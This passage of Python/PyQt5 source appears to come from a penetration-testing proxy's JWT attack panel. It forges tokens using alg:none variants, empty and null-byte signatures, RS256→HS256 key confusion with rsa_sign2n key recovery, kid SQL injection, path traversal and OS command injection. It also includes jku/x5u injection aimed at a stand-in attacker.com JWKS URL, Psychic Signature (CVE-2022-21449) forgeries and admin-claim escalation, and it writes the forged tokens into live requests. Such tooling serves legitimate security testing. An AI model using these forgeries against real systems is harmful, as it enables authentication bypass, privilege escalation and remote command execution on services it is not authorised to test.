        atk_frame.setFixedHeight(90)
        atk_vl = QVBoxLayout(atk_frame)
        atk_vl.setContentsMargins(8, 6, 8, 6)
        atk_vl.setSpacing(4)

        # Row 1: attack buttons
        btn_row1 = QHBoxLayout()
        btn_row1.setSpacing(5)

        _atk_style = (
            "QPushButton{background:#1a0a0a;color:#f38ba8;border:1px solid #7a3030;"
            "border-radius:3px;font-size:11px;padding:3px 9px;font-weight:600;}"
            "QPushButton:hover{background:#2a1010;}"
        )
        _safe_style = (
            "QPushButton{background:#0a1a0a;color:#a6e3a1;border:1px solid #3a6a3a;"
            "border-radius:3px;font-size:11px;padding:3px 9px;}"
            "QPushButton:hover{background:#102010;}"
        )
        _neutral_style = (
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};border-radius:3px;font-size:11px;padding:3px 9px;}}"
            f"QPushButton:hover{{background:{COLOR_HOVER};}}"
        )

        apply_atk_btn = QPushButton("⚡ Apply Attack ▾")
        apply_atk_btn.setStyleSheet(_atk_style)
        apply_atk_btn.setToolTip(
            "Open attack menu — choose a technique, optionally edit payload claims, then apply."
        )
        apply_atk_btn.clicked.connect(lambda: self._jwt_show_attack_menu(apply_atk_btn))
        btn_row1.addWidget(apply_atk_btn)

        btn_row1.addStretch()

        remove_sig_btn = QPushButton("🗑 Remove Sig")
        remove_sig_btn.setStyleSheet(_atk_style)
        remove_sig_btn.setToolTip(
            "Strip the signature from the token (set to empty).\n"
            "Token becomes: header.payload.  (no signature)"
        )
        remove_sig_btn.clicked.connect(self._jwt_remove_signature)
        btn_row1.addWidget(remove_sig_btn)

        copy_orig_btn = QPushButton("📋 Copy Original")
        copy_orig_btn.setStyleSheet(_neutral_style)
        copy_orig_btn.setToolTip("Copy the original (unmodified) JWT to clipboard")
        copy_orig_btn.clicked.connect(self._jwt_copy_original)
        btn_row1.addWidget(copy_orig_btn)

        atk_vl.addLayout(btn_row1)

        # Row 2: resign + apply
        btn_row2 = QHBoxLayout()
        btn_row2.setSpacing(5)

        resign_lbl = QLabel("Sign HS256 secret:")
        resign_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")
        btn_row2.addWidget(resign_lbl)

        self._jwt_secret_input = QLineEdit()
        self._jwt_secret_input.setPlaceholderText("enter secret or leave blank for unsigned")
        self._jwt_secret_input.setFixedWidth(220)
        self._jwt_secret_input.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};"
            f"border-radius:3px;padding:2px 6px;font-size:11px;"
        )
        self._jwt_secret_input.setEchoMode(QLineEdit.Password)
        btn_row2.addWidget(self._jwt_secret_input)

        show_secret_btn = QPushButton("👁")
        show_secret_btn.setFixedSize(24, 24)
        show_secret_btn.setCheckable(True)
        show_secret_btn.setStyleSheet(_neutral_style.replace("padding:3px 9px", "padding:0"))
        show_secret_btn.setToolTip("Show/hide secret")
        show_secret_btn.toggled.connect(
            lambda c: self._jwt_secret_input.setEchoMode(
                QLineEdit.Normal if c else QLineEdit.Password
            )
        )
        btn_row2.addWidget(show_secret_btn)

        resign_btn = QPushButton(" Sign & Apply")
        resign_btn.setStyleSheet(_safe_style)
        resign_btn.setToolTip(
            "Re-sign the JWT with the secret above using HS256.\n"
            "Updates the request with the modified token."
        )
        resign_btn.clicked.connect(self._jwt_resign_and_apply)
        btn_row2.addWidget(resign_btn)

        btn_row2.addSpacing(6)

        km_sign_btn = QPushButton(" Sign with Key ▾")
        km_sign_btn.setStyleSheet(
            "QPushButton{background:#1a1a0a;color:#e5c07b;border:1px solid #7a6a2a;"
            "border-radius:3px;font-size:11px;padding:3px 9px;font-weight:600;}"
            "QPushButton:hover{background:#2a2a10;}"
        )
        km_sign_btn.setToolTip(
            "Select a key from the JWT tab Key Manager and sign the current token with it.\n"
            "Supports symmetric (HS256/384/512), RSA (RS/PS256/384/512), EC (ES256/384/512) and OKP (EdDSA)."
        )
        km_sign_btn.clicked.connect(lambda: self._jwt_show_km_key_menu(km_sign_btn))
        btn_row2.addWidget(km_sign_btn)

        btn_row2.addSpacing(10)

        copy_mod_btn = QPushButton("📋 Copy Modified")
        copy_mod_btn.setStyleSheet(_neutral_style)
        copy_mod_btn.setToolTip("Copy the current (edited) JWT to clipboard")
        copy_mod_btn.clicked.connect(self._jwt_copy_modified)
        btn_row2.addWidget(copy_mod_btn)

        btn_row2.addStretch()

        atk_vl.addLayout(btn_row2)
        vl.addWidget(atk_frame)

        # Live-apply: re-encode header+payload on every edit (400 ms debounce)
        # keeping the ORIGINAL signature untouched.
        self._jwt_live_timer = QTimer(self)
        self._jwt_live_timer.setSingleShot(True)
        self._jwt_live_timer.setInterval(400)
        self._jwt_live_timer.timeout.connect(self._jwt_live_apply)
        self._jwt_req_hdr_edit.textChanged.connect(self._jwt_live_timer.start)
        self._jwt_req_pay_edit.textChanged.connect(self._jwt_live_timer.start)

        return container

    def _build_jwt_resp_panel(self) -> QWidget:
        """Build the JWT response view (read-only analysis)."""
        container = QWidget()
        container.setStyleSheet(f"background:{COLOR_DARK_BG};")
        vl = QVBoxLayout(container)
        vl.setContentsMargins(0, 0, 0, 0)
        vl.setSpacing(0)

        # Info bar
        info_bar = QFrame()
        info_bar.setFixedHeight(44)
        info_bar.setStyleSheet("background:#11111b;border-bottom:1px solid #313244;")
        info_hl = QHBoxLayout(info_bar)
        info_hl.setContentsMargins(10, 4, 10, 4)
        self._jwt_resp_info_lbl = QLabel("JWT in Response")
        self._jwt_resp_info_lbl.setStyleSheet(
            f"color:{COLOR_TEXT};font-size:11px;background:transparent;"
        )
        self._jwt_resp_info_lbl.setWordWrap(True)
        info_hl.addWidget(self._jwt_resp_info_lbl)

        copy_to_req_btn = QPushButton("→ Use in Request")
        copy_to_req_btn.setStyleSheet(
            "QPushButton{background:#0a1a0a;color:#a6e3a1;border:1px solid #3a6a3a;"
            "border-radius:3px;font-size:11px;padding:2px 8px;}"
            "QPushButton:hover{background:#102010;}"
        )
        copy_to_req_btn.setToolTip(
            "Copy this JWT and add/replace it as 'Authorization: Bearer <token>' "
            "in the request editor"
        )
        copy_to_req_btn.clicked.connect(self._jwt_resp_use_in_request)
        info_hl.addWidget(copy_to_req_btn)
        vl.addWidget(info_bar)

        _spl_style = (
            f"QSplitter::handle:vertical{{background:{COLOR_BORDER};min-height:4px;}}"
            f" QSplitter::handle:vertical:hover{{background:#e5a550;}}"
        )
        spl = QSplitter(Qt.Vertical)
        spl.setHandleWidth(5)
        spl.setChildrenCollapsible(False)
        spl.setStyleSheet(_spl_style)

        hdr_panel, self._jwt_resp_hdr_edit = self._make_jwt_section(
            "  HEADER", "#e5a550", read_only=True)
        pay_panel, self._jwt_resp_pay_edit = self._make_jwt_section(
            "📋  PAYLOAD  (claims, roles, expiry)", "#89b4fa", read_only=True)
        sig_panel, self._jwt_resp_sig_edit = self._make_jwt_section(
            "🔒  SIGNATURE", "#6c7086", read_only=True, sig=True)

        spl.addWidget(hdr_panel)
        spl.addWidget(pay_panel)
        spl.addWidget(sig_panel)
        spl.setSizes([120, 300, 60])
        vl.addWidget(spl, 1)
        return container

    # ── JWT attack / action methods ───────────────────────────────────────────

    def _jwt_live_apply(self) -> None:
        """Called 400 ms after any edit to header or payload.
        Re-encodes header+payload from the editors and writes the token back
        into the raw request, preserving the ORIGINAL signature exactly.
        """
        if not self._jwt_req_mode:
            return
        try:
            hdr_json = json.loads(self._jwt_req_hdr_edit.toPlainText() or '{}')
        except Exception:
            return  # don't apply while JSON is mid-edit / invalid
        try:
            pay_json = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            return

        hdr_b64 = self._b64url_encode(json.dumps(hdr_json, separators=(',', ':')).encode())
        pay_b64 = self._b64url_encode(json.dumps(pay_json, separators=(',', ':')).encode())
        # Preserve the original signature from the token first loaded into the panel
        orig_sig = self._jwt_state.get('req', {}).get('raw_sig', '')
        new_tok = f"{hdr_b64}.{pay_b64}.{orig_sig}"
        self._jwt_replace_in_request(new_tok)
        # Keep the sig display accurate (showing original sig, not "(unsigned)")
        self._jwt_req_sig_display.blockSignals(True)
        self._jwt_req_sig_display.setPlainText(orig_sig if orig_sig else '(unsigned)')
        self._jwt_req_sig_display.blockSignals(False)

    def _jwt_build_modified(self, alg_override: str = None, secret: bytes = None) -> str:
        """
        Re-encode JWT from the current panel editors.
        alg_override: force a specific algorithm value in the header.
        secret: if provided, sign with HMAC-SHA256.
        Returns the new JWT string.
        """
        try:
            hdr_json = json.loads(self._jwt_req_hdr_edit.toPlainText() or '{}')
        except Exception:
            hdr_json = {}
        try:
            pay_json = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            pay_json = {}

        if alg_override is not None:
            hdr_json['alg'] = alg_override

        hdr_b64  = self._b64url_encode(json.dumps(hdr_json, separators=(',',':')).encode())
        pay_b64  = self._b64url_encode(json.dumps(pay_json, separators=(',',':')).encode())
        signing_input = f"{hdr_b64}.{pay_b64}".encode('utf-8')

        if secret is not None:
            sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
            sig_b64 = self._b64url_encode(sig)
        else:
            sig_b64 = ""

        return f"{hdr_b64}.{pay_b64}.{sig_b64}"

    def _jwt_replace_in_request(self, new_token: str) -> bool:
        """Replace the original JWT token in the raw request with new_token. Returns True on success."""
        req_jwt = self._jwt_state.get('req', {})
        original = req_jwt.get('token', '')
        if not original:
            return False
        raw = self.request_editor.toPlainText()
        if original not in raw:
            return False
        new_raw = raw.replace(original, new_token, 1)
        self.request_editor.blockSignals(True)
        self.request_editor.setPlainText(new_raw)
        self.request_editor.blockSignals(False)
        # Keep jwt_state updated so toggle still works
        self._jwt_state['req']['token'] = new_token
        parts = new_token.split('.')
        if len(parts) == 3:
            self._jwt_state['req']['raw_header'] = parts[0]
            self._jwt_state['req']['raw_payload'] = parts[1]
            self._jwt_state['req']['raw_sig'] = parts[2]
        return True

    def _ensure_ngrok_header(self, url: str) -> None:
        """Inject 'ngrok-skip-browser-warning: true' into the raw request when the
        attacker URL points to an ngrok tunnel, so the browser-interstitial page
        is bypassed for any direct or reflected fetch against that URL.
        Does nothing if the URL is not a ngrok URL or the header is already present.
        """
        if "ngrok" not in url.lower():
            return
        header_line = "ngrok-skip-browser-warning: true"
        raw = self.request_editor.toPlainText()
        if "ngrok-skip-browser-warning" in raw.lower():
            return  # already present — don't duplicate
        # Insert the header at the end of the HTTP header section
        if "\r\n\r\n" in raw:
            head_part, body_part = raw.split("\r\n\r\n", 1)
            new_raw = head_part + "\r\n" + header_line + "\r\n\r\n" + body_part
        elif "\n\n" in raw:
            head_part, body_part = raw.split("\n\n", 1)
            new_raw = head_part + "\n" + header_line + "\n\n" + body_part
        else:
            new_raw = raw.rstrip("\n") + "\n" + header_line
        self.request_editor.blockSignals(True)
        self.request_editor.setPlainText(new_raw)
        self.request_editor.blockSignals(False)

    def _jwt_apply_sign2n_attack(self, candidate_pems: list,
                                   payload_overrides: dict = None) -> None:
        """
        Apply the rsa_sign2n RS256→HS256 attack using a list of recovered public-key
        PEM strings as candidate HMAC-SHA256 secrets.

        The first candidate is applied to the raw request immediately (most likely
        to be correct after GCD simplification).  When more than one candidate is
        available all forged tokens are copied to the clipboard so the user can try
        them in sequence manually.
        """
        try:
            hdr = json.loads(self._jwt_req_hdr_edit.toPlainText() or '{}')
        except Exception:
            hdr = {}
        try:
            pay = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            pay = {}
        if payload_overrides:
            pay.update(payload_overrides)

        hdr_forged = dict(hdr)
        hdr_forged['alg'] = 'HS256'

        def _b64e(d: dict) -> str:
            return self._b64url_encode(
                json.dumps(d, separators=(',', ':')).encode()
            )

        hb = _b64e(hdr_forged)
        pb = _b64e(pay)
        signed_part = f"{hb}.{pb}".encode('ascii')

        forged_tokens: list = []
        for pem in candidate_pems:
            secret = pem.encode('utf-8')
            raw_sig = hmac.new(secret, signed_part, hashlib.sha256).digest()
            sig = self._b64url_encode(raw_sig)
            forged_tokens.append(f"{hb}.{pb}.{sig}")

        # Update header editor
        self._jwt_req_hdr_edit.blockSignals(True)
        self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr_forged, indent=2))
        self._jwt_req_hdr_edit.blockSignals(False)

        # Apply first candidate to the request
        first_tok = forged_tokens[0]
        self._jwt_req_sig_display.setPlainText(
            first_tok.split('.')[-1][:24] + '…'
        )

        if self._jwt_replace_in_request(first_tok):
            if 'req' in self._jwt_state:
                self._jwt_state['req']['raw_sig'] = first_tok.split('.')[-1]

        n = len(forged_tokens)
        if n == 1:
            self.status_bar.setText(
                "⚡ sign2n: candidate key applied to request — send to check"
            )
        else:
            # Copy all candidates to the clipboard for manual iteration
            clip_text = '\n\n'.join(
                f"# Candidate {i + 1} / {n}\n{tok}"
                for i, tok in enumerate(forged_tokens)
            )
            QApplication.clipboard().setText(clip_text)
            self.status_bar.setText(
                f"⚡ sign2n: {n} candidates — #1 applied to request, "
                f"all {n} tokens copied to clipboard"
            )

        QTimer.singleShot(6000, lambda: self.status_bar.setText("Ready"))

    def _jwt_alg_none_attack(self, alg_value="none") -> None:
        """alg:none / alg:false attack — set algorithm, clear signature, apply to request."""
        new_tok = self._jwt_build_modified(alg_override=alg_value, secret=None)
        # Update signature display
        self._jwt_req_sig_display.setPlainText('(unsigned)')
        # Update header editor to reflect new alg
        try:
            hdr = json.loads(self._jwt_req_hdr_edit.toPlainText())
            hdr['alg'] = alg_value
            self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr, indent=2))
        except Exception:
            pass
        # Use JSON representation for display (False → false, "none" → none)
        alg_display = json.dumps(alg_value)
        if self._jwt_replace_in_request(new_tok):
            self.status_bar.setText(
                f"⚡ alg:{alg_display} attack applied — token is now unsigned in request"
            )
        else:
            QApplication.clipboard().setText(new_tok)
            self.status_bar.setText(
                f"⚡ alg:{alg_display} token copied to clipboard (original not found in request)"
            )
        QTimer.singleShot(4000, lambda: self.status_bar.setText("Ready"))

    def _jwt_rs256_to_hs256_attack(self) -> None:
        """
        RS256 → HS256 key confusion attack.
        Prompts for the public key to use as the HMAC secret.
        """
        try:
            hdr = json.loads(self._jwt_req_hdr_edit.toPlainText())
        except Exception:
            hdr = {}
        if hdr.get('alg', '') not in ('RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512'):
            QMessageBox.information(
                self, "RS256→HS256",
                "Current algorithm is not an asymmetric one.\n"
                "This attack is for RS256/ES256 → HS256 (public key as HMAC secret)."
            )
            return
        pub_key, ok = QInputDialog.getMultiLineText(
            self, "RS256→HS256 Key Confusion",
            "Paste the server's PUBLIC KEY (PEM) below.\n"
            "It will be used as the HMAC-SHA256 secret:",
            ""
        )
        if not ok or not pub_key.strip():
            return
        secret_bytes = pub_key.strip().encode('utf-8')
        hdr['alg'] = 'HS256'
        self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr, indent=2))
        new_tok = self._jwt_build_modified(alg_override='HS256', secret=secret_bytes)
        if self._jwt_replace_in_request(new_tok):
            self.status_bar.setText("⚡ RS256→HS256 token applied to request")
        else:
            QApplication.clipboard().setText(new_tok)
            self.status_bar.setText("⚡ RS256→HS256 token copied to clipboard")
        QTimer.singleShot(4000, lambda: self.status_bar.setText("Ready"))

    # ── Attack menu / dialog / execution ─────────────────────────────────────

    _JWT_ATTACK_CATALOG = [
        ("alg:none Variants", [
            ("alg:none",
             "Set alg to 'none' (lowercase) — most common unsigned-token bypass."),
            ("alg:None",
             "Set alg to 'None' (capital N) — evades case-sensitive 'none' blocks."),
            ("alg:NONE",
             "Set alg to 'NONE' (ALL CAPS) — alternate capitalisation bypass."),
            ("alg:nOnE",
             "Set alg to 'nOnE' — mixed-case evasion variant."),
            ("alg:NoNe",
             "Set alg to 'NoNe' — mixed-case evasion variant."),
        ]),
        ("Signature Bypass", [
            ("Empty signature",
             "Token ends with '.' — empty signature; some libraries skip verification."),
            ("Null byte signature",
             "Signature is a base64url-encoded \\x00 — triggers null-termination bugs in C parsers."),
            ("Blank password",
             "Signed with empty HS256 secret — catches blank or default secret configurations."),
        ]),
        ("Algorithm Confusion", [
            ("RS256→HS256 (pubkey as secret)",
             "Switch RS256 to HS256 and sign with the server's RSA public key as HMAC secret."),
            ("RS256→HS256 (sign2n — 2 tokens)",
             "Recover the RSA public key from two valid RS256 tokens using the rsa_sign2n "
             "technique (GCD of sᵉ − padded_hash pairs), then forge a token signed with "
             "alg=HS256 using the recovered key PEM bytes as the HMAC-SHA256 secret."),
        ]),
        ("kid Injection", [
            ("kid SQLi (union '1')",
             "SQL injection in kid header — UNION SELECT returns '1' as the signing key."),
            ("kid SQLi (union secret)",
             "SQL injection in kid — forces DB to return 'secret'."),
            ("kid SQLi (0x secret-key)",
             "SQL injection in kid — hex-encoded key payload."),
            ("kid SQLi (char secret)",
             "SQL injection in kid using CHAR() function."),
            ("kid blank (empty secret)",
             "Empty kid field — signed with empty HMAC secret."),
            ("kid traversal ../../../../../../dev/null",
             "Path traversal to /dev/null — empty file → empty HMAC key."),
        ]),
        ("kid RCE", [
            ("kid RCE (sleep 10)",
             "OS command injection via kid — time-delay to confirm blind RCE."),
            ("kid RCE (id)",
             "OS command injection via kid — executes 'id'."),
            ("kid RCE (whoami)",
             "OS command injection via kid — executes 'whoami'."),
        ]),
        ("Header Injection", [
            ("jku injection",
             "Inject attacker-controlled jku URL — server fetches attacker's JWKS."),
            ("x5u injection",
             "Inject attacker-controlled x5u URL — server fetches attacker's X.509 cert."),
            ("Embedded JWK (self-signed)",
             "Embed a self-generated JWK in the header — server validates against attacker key (CVE-2018-0114)."),
        ]),
        ("Claim Manipulation", [
            ("Exp extension (+1 year)",
             "Extend the 'exp' claim by 1 year — bypasses expiry checks on trusted-sig tokens."),
            ("Null claim: sub=None",
             "Set 'sub' to JSON null — may bypass identity checks."),
            ("Null claim: sub=''",
             "Set 'sub' to empty string."),
            ("Null claim: sub='null'",
             "Set 'sub' to string literal 'null'."),
            ("Null claim: sub='*'",
             "Set 'sub' to wildcard '*' — some libs match any user."),
        ]),
        ("Privilege Escalation", [
            ("Priv-esc: role=admin, isAdmin=True",
             "Set role=admin and isAdmin=True in payload."),
            ("Priv-esc: roles=['admin','superadmin'], scope=admin write read",
             "Set roles array and scope — covers array-based role checks."),
            ("Priv-esc: user_type=admin, permissions=[...]",
             "Set user_type=admin with full permissions array."),
        ]),
        ("Combined Attacks", [
            ("alg:none + role=admin, isAdmin=True",
             "alg:none bypass AND privilege escalation — no sig AND admin claims."),
            ("alg:none + exp+1yr",
             "alg:none bypass AND extend expiry — skips sig AND expiry checks."),
            ("FULL BYPASS alg:none (admin+exp+nosig)",
             "Maximum-impact: alg:none + admin claims + exp extended + no signature."),
            ("kid SQLi+alg:none (null secret)",
             "kid SQL injection combined with alg:none — double bypass."),
        ]),
        ("CVE Attacks", [
            ("Psychic Sig (ES256) CVE-2022-21449",
             "ECDSA 'Psychic Signature' — zero-value (r=0,s=0) accepted by vulnerable JDK."),
            ("Psychic Sig (ES384) CVE-2022-21449",
             "Psychic signature for ES384."),
            ("Psychic Sig (ES512) CVE-2022-21449",
             "Psychic signature for ES512."),
        ]),
    ]

    def _jwt_collect_imported_attacks(self) -> list:
        """
        Build an attack list from JWTEngine so Repeater stays aligned with JWT Tab.
        Returns list of tuples: (display_name, token, description).
        """
        try:
            from modules.jwt_tab import JWTEngine
        except Exception:
            return []

        try:
            hdr = json.loads(self._jwt_req_hdr_edit.toPlainText() or '{}')
        except Exception:
            hdr = {}
        try:
            pay = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            pay = {}

        secret_txt = (self._jwt_secret_input.text() or "").strip() if hasattr(self, '_jwt_secret_input') else ""
        secret = secret_txt.encode('utf-8') if secret_txt else b"secret"
        attacker_url = "https://attacker.com/jwks.json"

        out = []

        def _add_many(prefix: str, items, desc: str):
            for n, tok in items:
                out.append((f"{prefix} {n}", tok, desc))

        # Single-technique attacks
        try:
            _add_many("[IMP]", JWTEngine.forge_alg_none(hdr, pay), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            n, tok = JWTEngine.forge_empty_signature(hdr, pay)
            out.append((f"[IMP] {n}", tok, "Imported from JWT Analyzer"))
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_embedded_jwk(hdr, pay), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            variants, _jwks = JWTEngine.forge_jku_injection(hdr, pay, attacker_url, secret)
            _add_many("[IMP]", variants, f"Imported from JWT Analyzer (jku at {attacker_url})")
        except Exception:
            pass
        try:
            variants, _pem = JWTEngine.forge_x5u_injection(hdr, pay, attacker_url, secret)
            _add_many("[IMP]", variants, f"Imported from JWT Analyzer (x5u at {attacker_url})")
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_x5c_injection(hdr, pay), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_cty_injection(hdr, pay, secret), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_kid_sqli(hdr, pay), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_kid_traversal(hdr, pay), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_privilege_escalation(hdr, pay, secret), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            n, tok = JWTEngine.forge_exp_extension(hdr, pay, secret=secret)
            out.append((f"[IMP] {n}", tok, "Imported from JWT Analyzer"))
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_null_values(hdr, pay, secret), "Imported from JWT Analyzer")
        except Exception:
            pass

        # Mixed/combined attacks
        for fn_name in (
            "forge_alg_none_priv_esc",
            "forge_alg_none_exp_extend",
            "forge_alg_none_null_claims",
            "forge_kid_sqli_alg_none",
            "forge_embedded_jwk_priv_esc",
            "forge_full_bypass",
            "forge_psychic_signature",
            "forge_type_confusion",
            "forge_reflected_claims",
        ):
            try:
                fn = getattr(JWTEngine, fn_name)
                _add_many("[IMP]", fn(hdr, pay), "Imported from JWT Analyzer")
            except Exception:
                pass

        try:
            _add_many("[IMP]", JWTEngine.forge_jku_priv_esc(hdr, pay, attacker_url, secret),
                      f"Imported from JWT Analyzer (jku at {attacker_url})")
        except Exception:
            pass

        # Methods that return one token
        try:
            n, tok = JWTEngine.forge_blank_password(hdr, pay)
            out.append((f"[IMP] {n}", tok, "Imported from JWT Analyzer"))
        except Exception:
            pass

        try:
            _add_many("[IMP]", JWTEngine.forge_kid_rce(hdr, pay), "Imported from JWT Analyzer")
        except Exception:
            pass
        try:
            _add_many("[IMP]", JWTEngine.forge_ssrf_claims(hdr, pay), "Imported from JWT Analyzer")
        except Exception:
            pass

        # De-duplicate display names for menu stability
        seen = {}
        dedup = []
        for name, tok, desc in out:
            c = seen.get(name, 0) + 1
            seen[name] = c
            final_name = name if c == 1 else f"{name} ({c})"
            dedup.append((final_name, tok, desc))
        return dedup

    def _jwt_apply_prebuilt_attack(self, attack_name: str, token: str, description: str = "") -> None:
        """Apply a pre-forged token from imported JWTEngine techniques."""
        if not token or token.count('.') != 2:
            self.status_bar.setText(f"⚠ Could not apply attack: {attack_name}")
            QTimer.singleShot(3000, lambda: self.status_bar.setText("Ready"))
            return

        parts = token.split('.')
        hdr_obj = {}
        pay_obj = {}
        try:
            hdr_obj = json.loads(self._b64url_decode(parts[0]).decode('utf-8', errors='replace'))
        except Exception:
            pass
        try:
            pay_obj = json.loads(self._b64url_decode(parts[1]).decode('utf-8', errors='replace'))
        except Exception:
            pass

        self._jwt_req_hdr_edit.blockSignals(True)
        self._jwt_req_pay_edit.blockSignals(True)
        self._jwt_req_hdr_edit.setPlainText(json.dumps(hdr_obj, indent=2) if hdr_obj else "{}")
        self._jwt_req_pay_edit.setPlainText(json.dumps(pay_obj, indent=2) if pay_obj else "{}")
        self._jwt_req_hdr_edit.blockSignals(False)
        self._jwt_req_pay_edit.blockSignals(False)

        sig = parts[2]
        self._jwt_req_sig_display.setPlainText(sig if sig else "(unsigned)")

        if self._jwt_replace_in_request(token):
            if 'req' in self._jwt_state:
                self._jwt_state['req']['raw_sig'] = sig
            self.status_bar.setText(f"⚡ Imported attack applied: {attack_name}")
        else:
            QApplication.clipboard().setText(token)
            self.status_bar.setText(f"⚡ Imported token copied: {attack_name}")
        QTimer.singleShot(4000, lambda: self.status_bar.setText(description or "Ready"))

    def _jwt_show_attack_menu(self, btn: QPushButton) -> None:
        """Show the categorised attack list as a popup QMenu anchored to btn."""
        menu = QMenu(self)
        menu.setStyleSheet(
            f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};"
            f"border:1px solid {COLOR_BORDER};font-size:12px;}}"
            f"QMenu::item{{padding:5px 20px 5px 12px;}}"
            f"QMenu::item:selected{{background:#313244;}}"
            f"QMenu::separator{{height:1px;background:{COLOR_BORDER};margin:3px 0;}}"
        )
        for category, attacks in self._JWT_ATTACK_CATALOG:
            sub = menu.addMenu(f"▶  {category}")
            sub.setStyleSheet(menu.styleSheet())
            for name, desc in attacks:
                act = sub.addAction(name)
                act.setToolTip(desc)

                def _make_slot(n, d):
                    return lambda: self._jwt_trigger_attack(n, d)

                act.triggered.connect(_make_slot(name, desc))

        imported = self._jwt_collect_imported_attacks()
        if imported:
            menu.addSeparator()
            imp_sub = menu.addMenu(f"▶  Imported from JWT Analyzer ({len(imported)})")
            imp_sub.setStyleSheet(menu.styleSheet())
            for name, tok, desc in imported:
                act = imp_sub.addAction(name)
                act.setToolTip(desc)

                def _make_imp_slot(n, t, d):
                    return lambda: self._jwt_apply_prebuilt_attack(n, t, d)

                act.triggered.connect(_make_imp_slot(name, tok, desc))
        menu.exec_(btn.mapToGlobal(btn.rect().bottomLeft()))

    def _jwt_trigger_attack(self, attack_name: str, description: str) -> None:
        """Show the claim-editor dialog, then execute the attack on acceptance."""

        # ── sign2n: dedicated two-token dialog, handled separately ────────
        if attack_name == "RS256→HS256 (sign2n — 2 tokens)":
            try:
                _cur_pay = json.loads(self._jwt_req_pay_edit.toPlainText() or "{}")
            except Exception:
                _cur_pay = {}
            dlg = _Sign2nDialog(payload=_cur_pay, parent=self)
            if dlg.exec_() != QDialog.Accepted:
                return
            candidate_pems = dlg.get_candidate_pems()
            if not candidate_pems:
                self.status_bar.setText("⚠  sign2n: no candidate keys — run extraction first")
                QTimer.singleShot(4000, lambda: self.status_bar.setText("Ready"))
                return
            self._jwt_apply_sign2n_attack(candidate_pems, dlg.get_payload_overrides())
            return

        try:
            pay = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            pay = {}

        needs_url    = attack_name in ("jku injection", "x5u injection")
        needs_pubkey = attack_name == "RS256→HS256 (pubkey as secret)"

        # Collect RSA keys from the JWT tab Key Manager (if available)
        km_rsa_keys: list = []
        try:
            from PyQt5.QtWidgets import QApplication as _App
            for _w in _App.instance().topLevelWidgets():
                if hasattr(_w, 'jwt_tab') and hasattr(_w.jwt_tab, '_managed_keys'):
                    km_rsa_keys = [
                        k for k in _w.jwt_tab._managed_keys
                        if k.get('_type') == 'RSA' and k.get('_priv_jwk')
                    ]
                    break
        except Exception:
            pass

        dlg = _JWTAttackDialog(
            attack_name, description, pay,
            needs_url=needs_url, needs_pubkey=needs_pubkey,
            km_rsa_keys=km_rsa_keys if needs_url else None,
            parent=self,
        )
        if dlg.exec_() != QDialog.Accepted:
            return

        self._jwt_execute_attack(
            attack_name,
            dlg.get_payload_overrides(),
            dlg.get_extra_params(),
            km_key=dlg.get_selected_km_key() if needs_url else None,
        )

    def _jwt_execute_attack(self, attack_name: str,
                            payload_overrides: dict,
                            extra_params: dict,
                            km_key: Optional[dict] = None) -> None:
        """Forge a JWT for the selected technique and apply it to the raw request."""
        try:
            hdr = json.loads(self._jwt_req_hdr_edit.toPlainText() or '{}')
        except Exception:
            hdr = {}
        try:
            pay = json.loads(self._jwt_req_pay_edit.toPlainText() or '{}')
        except Exception:
            pay = {}

        pay.update(payload_overrides)

        def _b64e(d: dict) -> str:
            return self._b64url_encode(json.dumps(d, separators=(',', ':')).encode())

        def _sign_hs(hb: str, pb: str, secret: bytes) -> str:
            raw = hmac.new(secret, f"{hb}.{pb}".encode(), hashlib.sha256).digest()
            return self._b64url_encode(raw)

        final_hdr = dict(hdr)
        final_pay = dict(pay)
        new_tok: str | None = None

        # ── alg:none variants ─────────────────────────────────────────────
        if attack_name.startswith("alg:"):
            final_hdr['alg'] = attack_name[4:]     # "none" / "None" / "NONE" / ...
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        # ── signature bypass ──────────────────────────────────────────────
        elif attack_name == "Empty signature":
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            new_tok = f"{hb}.{pb}."
            self._jwt_req_sig_display.setPlainText('(unsigned)')

        elif attack_name == "Null byte signature":
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            null_sig = self._b64url_encode(b'\x00')
            new_tok = f"{hb}.{pb}.{null_sig}"
            self._jwt_req_sig_display.setPlainText(null_sig)

        elif attack_name == "Blank password":
            final_hdr['alg'] = 'HS256'
            hb = _b64e(final_hdr); pb = _b64e(final_pay)
            sig = _sign_hs(hb, pb, b'')
            new_tok = f"{hb}.{pb}.{sig}"
            self._jwt_req_sig_display.setPlainText(sig)

        # ── algorithm confusion ───────────────────────────────────────────
        elif attack_name == "RS256→HS256 (pubkey as secret)":
            # Keep as-is (with trailing newline) so the secret bytes match
